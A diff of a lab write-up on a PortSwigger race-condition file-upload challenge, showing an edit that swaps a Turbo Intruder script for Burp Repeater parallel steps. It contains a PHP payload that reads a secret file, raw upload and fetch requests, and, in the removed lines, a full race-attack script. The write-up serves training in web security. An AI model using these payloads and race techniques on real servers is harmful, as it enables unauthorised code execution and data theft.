@@ -22,11 +22,11 @@ Most file upload labs involve tricking the server's validation (wrong content-ty
 
 The vulnerability is in the **execution order:**
 
-```
+\`\`\`
 1. File is uploaded → temporarily saved to disk
 2. Server validates the file
 3. If invalid → file is deleted
-```
+\`\`\`
 
 Between steps 1 and 3, there is a tiny window where the file **exists on disk and is executable**. If you can send a GET request to that file during this window — before deletion — the PHP code executes.
 
@@ -55,7 +55,7 @@ The server's validation was genuinely robust against all standard bypasses. The 
 
 Logged in and uploaded a legitimate image as avatar. Intercepted in Burp Proxy:
 
-```
+\`\`\`
 POST /my-account/avatar HTTP/1.1
 Host: <lab-id>.web-security-academy.net
 Content-Type: multipart/form-data; boundary=----boundary
@@ -66,13 +66,13 @@ Content-Type: image/jpeg
 
 <image data>
 ------boundary--
-```
+\`\`\`
 
 The uploaded file was fetched via:
 
-```
+\`\`\`
 GET /files/avatars/avatar.jpg HTTP/1.1
-```
+\`\`\`
 
 **Key observation:** Files are stored at `/files/avatars/<filename>` — meaning if a PHP file were to exist there even briefly, the server would execute it.
 
@@ -80,15 +80,15 @@ GET /files/avatars/avatar.jpg HTTP/1.1
 
 Created `exploit.php` containing:
 
-```php
+\`\`\`php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
-```
+\`\`\`
 
 This reads and outputs the contents of Carlos's secret file when executed server-side.
 
 ---
 
-## Exploitation — Race Condition via Turbo Intruder
+## Exploitation — Race Condition via Burp Intruder
 
 ### The Strategy
 
@@ -99,7 +99,7 @@ Send the POST upload request and multiple GET fetch requests **simultaneously** 
 Captured two requests in Proxy > HTTP History:
 
 **Request 1 — POST upload (malicious PHP):**
-```
+\`\`\`
 POST /my-account/avatar HTTP/1.1
 Host: <lab-id>.web-security-academy.net
 Cookie: session=<your-session>
@@ -111,63 +111,35 @@ Content-Type: application/x-php
 
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ------boundary--
-```
+\`\`\`
 
 **Request 2 — GET fetch (attempt execution):**
-```
+\`\`\`
 GET /files/avatars/exploit.php HTTP/1.1
 Host: <lab-id>.web-security-academy.net
 Cookie: session=<your-session>
-```
+\`\`\`
 
-### Step 2 — Turbo Intruder Race Condition Script
+### Step 2 — Burp Intruder + Repeater Parallel Setup
 
-Sent the POST request to Turbo Intruder (right-click → Extensions → Turbo Intruder → Send to Turbo Intruder).
+Sent the POST request to Burp Intruder and the GET request to Burp Repeater. Duplicated the GET tab 4 times to create 5 parallel GET requests. Used Repeater's **"Send group in parallel"** feature combined with Intruder to fire all requests as close to simultaneously as possible:
 
-Used the following script — the `gate` mechanism is critical here. It holds all requests until every byte is ready, then releases them all simultaneously:
+\`\`\`
+Step 1: Send POST /my-account/avatar → Burp Intruder
+Step 2: Send GET /files/avatars/exploit.php → Burp Repeater
+Step 3: Duplicate the GET tab 4 times (right-click tab → Duplicate)
+Step 4: Select all GET tabs → right-click → "Send group in parallel"
+Step 5: Simultaneously trigger the POST from Intruder
+Step 6: One of the parallel GETs hits the race window → PHP executes
+\`\`\`
 
-```python
-def queueRequests(target, wordlists):
-    engine = RequestEngine(
-        endpoint=target.endpoint,
-        concurrentConnections=10,
-    )
+**Why parallel sending matters:**
 
-    # POST request to upload the PHP file
-    request1 = '''POST /my-account/avatar HTTP/1.1
-Host: <lab-id>.web-security-academy.net
-Cookie: session=<your-session>
-Content-Type: multipart/form-data; boundary=----boundary
-Content-Length: <length>
-
-------boundary
-Content-Disposition: form-data; name="avatar"; filename="exploit.php"
-Content-Type: application/x-php
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
-------boundary--'''
-
-    # GET request to fetch and execute the PHP file
-    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
-Host: <lab-id>.web-security-academy.net
-Cookie: session=<your-session>
-
-'''
-
-    # Queue the POST with gate tag — held until openGate
-    engine.queue(request1, gate='race1')
-
-    # Queue 5 GET requests with same gate tag
-    for x in range(5):
-        engine.queue(request2, gate='race1')
-
-    # Release ALL requests simultaneously
-    engine.openGate('race1')
-    engine.complete(timeout=60)
-
-def handleResponse(req, interesting):
-    table.add(req)
-```
+| Method | Problem |
+|--------|---------|
+| Normal Repeater (single) | Sequential — file already deleted by the time GET arrives |
+| Intruder default | Requests fire at different times — misses the window |
+| Repeater "Send group in parallel" | All GETs fire simultaneously — maximises chance of hitting window |
 
 ### Step 3 — Results
 
@@ -190,7 +162,7 @@ One GET request hit the execution window — the file existed on disk, PHP execu
 
 ## Attack Flow Summary
 
-```
+\`\`\`
 1. Upload exploit.php via POST ──────────────────────────────┐
                                                               ↓
 2. File saved to /files/avatars/exploit.php          [RACE WINDOW]
@@ -198,27 +170,27 @@ One GET request hit the execution window — the file existed on disk, PHP execu
 3. Server begins validation ──── GET requests fire ──→ PHP executes
                                                               ↓
 4. Validation completes → file deleted               Secret returned
-```
+\`\`\`
 
-The race window is typically a few milliseconds. The `gate` mechanism in Turbo Intruder ensures all requests are sent as close to simultaneously as possible, maximising the chance of hitting that window.
+The race window is typically a few milliseconds. Burp Repeater's **"Send group in parallel"** feature ensures all GET requests fire simultaneously, maximising the chance of hitting that window.
 
 ---
 
-## Why the Gate Mechanism is Critical
+## Why Parallel Sending is Critical
 
-Without the gate, requests would be sent sequentially — the GET requests would arrive either all before the upload completes (404 — file doesn't exist yet) or all after deletion (404 — file already gone).
+Without parallel sending, requests arrive sequentially — GETs either all arrive before the upload completes (404) or all after deletion (404). Sending the group in parallel ensures all GETs arrive within the same millisecond window as the POST.
 
-The gate holds the final byte of every request until `openGate()` is called, then flushes them all at once. This synchronises the timing so the POST and GET requests arrive at the server within the same millisecond window.
+> **Note:** This attack is probabilistic. One in five GET requests hit the window here. If all return 404, repeat the attack — the race window exists, it just needs to be hit.
 
 ---
 
 ## Key Takeaways
 
-- **Race conditions exist in validation logic, not just business logic** — any server that temporarily stores a file before validating it is potentially vulnerable to this attack
-- **A bypass doesn't always mean fooling the filter** — here the filter worked correctly. The vulnerability was in the time gap between save and delete, not in the filter itself
-- **Parallel request tools are essential for race conditions** — Burp's standard Repeater sends requests sequentially; Turbo Intruder's gate mechanism is purpose-built for synchronised timing attacks
-- **Not all GET requests will succeed** — this attack is probabilistic. One in five succeeded here. In a real engagement you might need more parallel requests or multiple attempts
-- **This technique applies beyond file upload** — any operation that has a TOCTOU gap (check then use) is potentially vulnerable: password reset token validation, two-factor authentication windows, coupon code redemption
+- **Race conditions exist in validation logic, not just business logic** — any server that temporarily stores a file before validating it is potentially vulnerable
+- **A bypass does not always mean fooling the filter** — the filter worked correctly here; the vulnerability was purely in the timing gap
+- **Burp's native parallel sending handles race conditions** — no extensions needed; Repeater's "Send group in parallel" is built for exactly this
+- **This attack is probabilistic** — one in five succeeded here; repeat if needed or increase the number of parallel GET requests
+- **TOCTOU applies beyond file upload** — password reset tokens, 2FA windows, and coupon redemption are all potentially vulnerable
 
 ---
 
@@ -229,8 +201,6 @@ This attack pattern appears in real applications wherever:
 - Cloud storage pre-signed URLs have delayed permission checks
 - CDN edge caches serve files before origin validation completes
 
-In a real pentest or bug bounty, finding this requires understanding the application's file processing pipeline — not just testing upload endpoints with standard bypasses.
-
 ---
 
 ## Tools Used
@@ -238,7 +208,8 @@ In a real pentest or bug bounty, finding this requires understanding the applica
 | Tool | Purpose |
 |------|---------|
 | Burp Suite Professional | Proxy, HTTP history, request capture |
-| Turbo Intruder | Synchronised parallel request sending via gate mechanism |
+| Burp Intruder | Upload POST request triggering |
+| Burp Repeater (parallel group) | Simultaneous GET requests to hit the race window |
 | PHP | Payload language for server-side code execution |
 
 ---
@@ -248,7 +219,6 @@ In a real pentest or bug bounty, finding this requires understanding the applica
 - [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
 - [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
 - [TOCTOU Race Conditions — OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use)
-- [Turbo Intruder Documentation](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
 
 ---
 
